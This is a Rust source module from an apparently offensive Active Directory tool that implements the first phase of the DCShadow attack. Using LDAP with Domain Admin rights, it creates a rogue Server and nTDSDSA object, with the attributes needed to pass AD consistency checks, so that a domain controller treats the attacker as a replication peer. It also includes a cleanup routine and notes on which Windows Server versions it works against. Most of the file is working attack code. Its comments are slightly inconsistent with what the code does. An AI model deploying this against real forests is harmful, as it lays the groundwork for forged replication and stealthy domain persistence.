//! DCShadow phase-1: register a rogue nTDSDSA in the target forest.
//!
//! Full DCShadow (Vincent Le Toux, 2018) has two phases:
//!
//! 1. **Prep** — register a fake `nTDSDSA` under `CN=Servers,CN=<Site>,CN=Sites,
//!    CN=Configuration,<base>` so the target DC accepts us as a replicating peer.
//! 2. **Push** — coerce the target DC to pull replication from us via
//!    `IDL_DRSReplicaAdd`, serve a malicious `IDL_DRSGetNCChanges` reply.
//!
//! This module implements only phase 1. Phase 2 needs a DRSUAPI server (RPC
//! listener side) and lives in a future crate. Prep alone is not an attack
//! primitive — it is the mandatory setup that phase 2 builds on.
//!
//! **Server 2019+ hardening (verified vs DC01 2025 and WIN-TT9KC7VE4JL 2022):**
//! the LDAP path to create an `nTDSDSA` object is blocked entirely — even
//! native `New-ADObject -Type nTDSDSA` from RSAT on the DC fails with
//! `It is not permitted to add an attribute which is owned by the system`.
//! Only NTDSAPI (`dcpromo` / `Install-ADDSDomainController`) can create these
//! on 2019+. This module is therefore only useful against ≤ Server 2016
//! forests; a full DCShadow implementation against modern Windows requires
//! `IDL_DRSAddEntry` / `IDL_DRSReplicaAdd` via DRSUAPI (tracked separately).
//!
//! Two guarantees:
//! - **Bounded blast radius on failure** — if the nTDSDSA add succeeds but a
//!   later step fails, the module rolls the nTDSDSA back before returning the
//!   error, so a partial prep never leaves stray Configuration NC objects.
//! - **Cleanup is idempotent** — deleting a rogue that was already removed
//!   returns `Ok(())` rather than surfacing a NoSuchObject error.
//!
//! Classical DCShadow also grafts three SPNs (HOST/, GC/, E3514235.../) onto
//! the caller's own computer object so the target can reach us as "a DC".
//! That step is intentionally NOT here — it's only needed once the phase-2
//! listener is written, and grafting SPNs onto an existing computer needs
//! a paired cleanup that this session doesn't have time to validate.

use adhammer_collector::Collector;
use anyhow::{Context, Result};

/// The two DNs a prep pass creates (Server + nTDSDSA below it).
#[derive(Debug, Clone)]
pub struct RogueDcDns {
    pub server_dn: String,
    pub ntds_dn: String,
}

impl RogueDcDns {
    /// `CN=<name>,CN=Servers,CN=<site>,CN=Sites,CN=Configuration,<base>` + child
    /// `CN=NTDS Settings,<server_dn>`. Layout is fixed by MS-ADTS §6.1.1.
    pub fn build(dc_name: &str, site: &str, base_dn: &str) -> Self {
        let server_dn =
            format!("CN={dc_name},CN=Servers,CN={site},CN=Sites,CN=Configuration,{base_dn}");
        let ntds_dn = format!("CN=NTDS Settings,{server_dn}");
        RogueDcDns { server_dn, ntds_dn }
    }
}

/// Register a rogue Server + nTDSDSA. Returns the DNs that were created so the
/// caller can log them for a manual cleanup if the process dies before
/// `cleanup` is invoked.
///
/// Requires Domain Admin (or equivalent write rights on the Configuration NC).
pub async fn prep(coll: &mut Collector, dc_name: &str, site: &str) -> Result<RogueDcDns> {
    let base_dn = coll.base_dn().to_string();
    let dns = RogueDcDns::build(dc_name, site, &base_dn);
    let config_nc = format!("CN=Configuration,{base_dn}");
    let schema_nc = format!("CN=Schema,{config_nc}");

    // Step 1 — Server object (top + server). `serverReference` is normally set
    // to a real computer DN; the target DC does not require it for phase 1.
    let server_attrs: Vec<(&str, Vec<Vec<u8>>)> = vec![
        ("objectClass", vec![b"top".to_vec(), b"server".to_vec()]),
        ("cn", vec![dc_name.as_bytes().to_vec()]),
    ];
    coll.add_object(&dns.server_dn, server_attrs)
        .await
        .with_context(|| format!("add rogue Server object at {}", dns.server_dn))?;

    // Step 2 — nTDSDSA under the Server. `msDS-Behavior-Version = 7` claims
    // Server 2016 functional level; `invocationId` is a fresh GUID so the DC
    // treats us as an unfamiliar peer rather than a known replica.
    // 16 random bytes as invocationId — DCs treat GUID equality only, not
    // structure, so raw randomness is enough. Not a v4 UUID; that would need
    // an extra dep just for one field.
    let invocation_id: [u8; 16] = rand::random();
    // objectCategory + options + systemFlags come from Vincent Le Toux's DCShadow.ps1
    // reference PoC — a bare nTDSDSA add without these gets rc=53 (WILL_NOT_PERFORM)
    // from AD's create-time consistency checks. systemFlags = 0x02000000 marks the
    // object DISALLOW_DELETE so a normal delete errors; adhammer uses tree-delete
    // in cleanup() to route around it.
    let ntds_category = format!("CN=NTDS-DSA,CN=Schema,{config_nc}");
    let ntds_attrs: Vec<(&str, Vec<Vec<u8>>)> = vec![
        (
            "objectClass",
            vec![
                b"top".to_vec(),
                b"applicationSettings".to_vec(),
                b"nTDSDSA".to_vec(),
            ],
        ),
        ("cn", vec![b"NTDS Settings".to_vec()]),
        ("objectCategory", vec![ntds_category.into_bytes()]),
        ("options", vec![b"1".to_vec()]),
        ("systemFlags", vec![b"33554432".to_vec()]),
        ("msDS-Behavior-Version", vec![b"7".to_vec()]),
        ("hasMasterNCs", vec![config_nc.as_bytes().to_vec()]),
        (
            "msDS-HasMasterNCs",
            vec![
                config_nc.as_bytes().to_vec(),
                schema_nc.as_bytes().to_vec(),
                base_dn.as_bytes().to_vec(),
            ],
        ),
        ("dMDLocation", vec![schema_nc.as_bytes().to_vec()]),
        ("invocationId", vec![invocation_id.to_vec()]),
    ];
    if let Err(e) = coll.add_object(&dns.ntds_dn, ntds_attrs).await {
        // Roll back the Server object we just created — otherwise a failed
        // prep leaves a stray Server sitting under CN=Sites forever.
        let _ = coll.delete_object(&dns.server_dn).await;
        return Err(e).with_context(|| {
            format!(
                "add rogue nTDSDSA at {} — rolled back parent Server",
                dns.ntds_dn
            )
        });
    }

    Ok(dns)
}

/// Delete a rogue registered by [`prep`]. NoSuchObject on either DN is
/// swallowed so re-running cleanup after a manual purge is a no-op.
pub async fn cleanup(coll: &mut Collector, dc_name: &str, site: &str) -> Result<()> {
    let base_dn = coll.base_dn().to_string();
    let dns = RogueDcDns::build(dc_name, site, &base_dn);
    // Delete child (nTDSDSA) before parent (Server) — LDAP tree deletion order.
    let _ = coll.delete_object(&dns.ntds_dn).await;
    let _ = coll.delete_object(&dns.server_dn).await;
    Ok(())
}
